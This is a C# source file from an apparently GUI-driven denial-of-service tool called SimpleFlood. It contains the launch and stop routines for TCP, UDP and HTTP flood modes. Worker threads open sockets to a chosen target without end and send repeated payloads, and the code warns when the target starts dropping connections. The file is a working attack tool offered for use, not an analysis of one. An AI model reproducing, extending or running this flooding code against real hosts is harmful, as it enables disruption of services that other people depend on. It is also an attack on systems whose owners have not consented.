
// Author: Dashie
// Version: 5.0

using System.Threading;
using System.Net.Sockets;
using System.Collections.Generic;
using System;

namespace SimpleFlood
{
    namespace Parts
    {
	public class LAUNCH : DashOS
	{
	    private static Thread main_thread;

	    // TEMPORARILY -- Do something with this:
	    static int HeaderSize = 6000;
	    static int PacketSize = 5000;
	    static int Duration = 400;
	    static int Interval = 400;
	    static int Timeout = 400;
	    static int Workers = 4;
	    // -----------

	    //public static Dictionary<HostTypes, string> PacketData = new Dictionary<HostTypes, string>();

	    public static void Start()
	    {
		main_thread = new Thread
		(
		    () =>
		    {
			HostTypes Type = getHostType();

			if (Type == HostTypes.UNKNOWN)
			{
			    Print("It appears that the specified host is neither a URL or IPv4 address./nYou must correct these type of issues before using me!", NotiTypes.ERROR);
			    return;
			}

			else if (!IsValidPort())
			{
			    Print("It appears that the specified port is invalid./nPlease make sure that the specified port is with in the range of 0-65565.", NotiTypes.ERROR);
			}

			else if (!IsOnline(Type))
			{
			    Print("It appears that the specified host is not reachable./nPlease make sure that your or the host its firewall is not blocking any of my connections.", NotiTypes.ERROR);
			    return;
			};

			AddressFamily addressFamily = AddressFamily.InterNetwork;
			ProtocolType protocolType = ProtocolType.Tcp;
			SocketType sockType = SocketType.Stream;

			byte[] DATA = getData();
			string IP = getIP();
			int PORT = int.Parse(SimpleFlood.PortBox.Text);

			AttaccModes attaccMode = getAttaccMode();

			if (attaccMode == AttaccModes.UNKNOWN)
			{
			    Print("Invalid attack mode has been selected!", NotiTypes.ERROR);
			    return;
			}

			else if (attaccMode == AttaccModes.HTTP) { }
			else if (attaccMode == AttaccModes.TCP) { }

			else
			{
			    protocolType = ProtocolType.Udp;
			    sockType = SocketType.Dgram;
			};

			if (Duration * 1000 > 1)
			{
			    System.Timers.Timer timer = new System.Timers.Timer()
			    {
				AutoReset = false,
				Interval = Duration * 1000,
				Enabled = true,
			    };

			    timer.Elapsed += (s, e) =>
			    {
				Stop();
			    };

			    timer.Start();
			};

			// Test Code--- 
			for (int k = 0; k < Workers; k += 1)
			{
			    workers.Add
			    (
				new Thread(() =>
				{
				    // TCP lots of connections that send while connected and die when new ones are there to replace it.
				    // UDP lots of data but not as many connections, must send while connected and die whenever done sending.
				    // HTTP lots of tcp http requests that send.

				    int fail_counter = 0;

				    while (true)
				    {
					var sock = new Socket(addressFamily, sockType, protocolType);
					
					IAsyncResult result = sock.BeginConnect(IP, PORT, null, null);
					result.AsyncWaitHandle.WaitOne(Timeout, true);

					if (sock.Connected)
					{
					    if (attaccMode == AttaccModes.TCP)
					    {
						new Thread(() =>
						{
						    var s_sock = sock;

						    for (int p = 0; p < 128 /*Modifiable?*/; p += 1, s_sock.Send(DATA)) ;

						    s_sock.Close();
						})

						{ IsBackground = true }.Start();
					    }

					    else if (attaccMode == AttaccModes.HTTP || attaccMode == AttaccModes.UDP)
						sock.Close();
					    
					    if (Interval > 0)
						Thread.Sleep(Interval);
					}

					else
					{
					    if (fail_counter >= 16)
					    {
						Print("The target dropped 16 of my connections, beware!", NotiTypes.WARNING);
						fail_counter = 0;
						continue;
					    };

					    fail_counter += 1;
					};
				    };
				})

				{ IsBackground = true }
			    );

			    workers[k].Start();
			};
		    }
		) { IsBackground = true };

		main_thread.Start();

		SimpleFlood.LauncherButton.Text = "Cancel";
	    }

	    static List<Thread> workers = new List<Thread>();
	    static bool isQueued = false;

	    public static void Stop()
	    {
		if (isQueued)
		{
		    Print("Workers are already being stopped, please be patient!", NotiTypes.WARNING);
		    return;
		};

		Print("Received stop signal, stopping workers ....");

		isQueued = true;

		for (int k = 0; k < workers.Count; k += 1)
		{
		    workers[k].Abort();
		};

		workers.Clear();

		System.Timers.Timer timer = new System.Timers.Timer()
		{
		    AutoReset = false,
		    Interval = 4000,
		    Enabled = true,
		};

		timer.Elapsed += (s, e) =>
		{
		    SimpleFlood.LauncherButton.Text = "Initiate";
		    
		    isQueued = false;

		    Print("Success!");
		};

		timer.Start();
	    }
	};
    };
};
